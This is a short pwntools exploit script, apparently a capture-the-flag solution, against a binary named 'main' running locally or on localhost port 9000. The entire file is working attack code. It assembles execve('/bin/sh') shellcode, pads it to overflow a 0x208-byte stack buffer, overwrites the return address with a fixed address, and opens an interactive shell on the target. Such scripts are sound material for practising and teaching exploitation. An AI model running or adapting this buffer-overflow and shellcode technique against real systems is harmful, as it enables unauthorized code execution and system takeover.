from pwn import*
context.arch="amd64"
import shutil

# This resolves the absolute path (e.g., /usr/bin/kitty) and tricks pwntools into ignoring it
context.terminal = [shutil.which('kitty'), 'sh', '-c']
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=1 # 0 remote , 1 local , 2 local + gdb
nc="nc localhost 9000"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b* vuln + 36
    c
    """)
    pause()
else:
    p=remote(r[1],int(r[2]),ssl=False)


asmcode="""
            movabs rdi,0x0068732f6e69622f
            push rdi
            mov rdi,rsp
            xor rax, rax
            xor rsi,rsi
            xor rdx,rdx
            mov al,0x3b
            syscall
            """ 
shellcode = asm(asmcode)
payload=shellcode 

payload+=b"a"*(0x208-len(payload))+p64(0x000000000040113a)
p.sendline(payload)

p.interactive()
